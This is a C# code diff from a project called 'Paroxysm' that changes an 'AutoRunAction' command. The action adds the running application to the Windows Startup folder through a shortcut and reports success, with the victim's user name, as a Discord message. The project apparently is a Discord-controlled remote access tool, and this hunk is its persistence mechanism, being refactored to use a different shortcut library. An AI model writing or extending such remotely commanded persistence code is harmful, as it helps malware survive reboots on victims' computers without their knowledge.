@@ -1,7 +1,7 @@
 ﻿using Discord;
-using IWshRuntimeLibrary;
 using Paroxysm.Discord;
 using Paroxysm.Tools;
+using ShellLink;
 
 namespace Paroxysm.Hooks.Actions;
 
@@ -22,10 +22,7 @@ public static class AutoRunAction
                 Directory.CreateDirectory(startupFolderPath);
             }
 
-            WshShell shell = new();
-            var shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
-            shortcut.TargetPath = appPath;
-            shortcut.Save();
+            Shortcut.CreateShortcut(appPath,appPath, 0).WriteToFile(shortcutPath);
 
             return DiscordEmbed.CreateWithText(Color.Green, "Command was successfully executed",
                 "Application has been added to startup.", Environment.UserName, null);
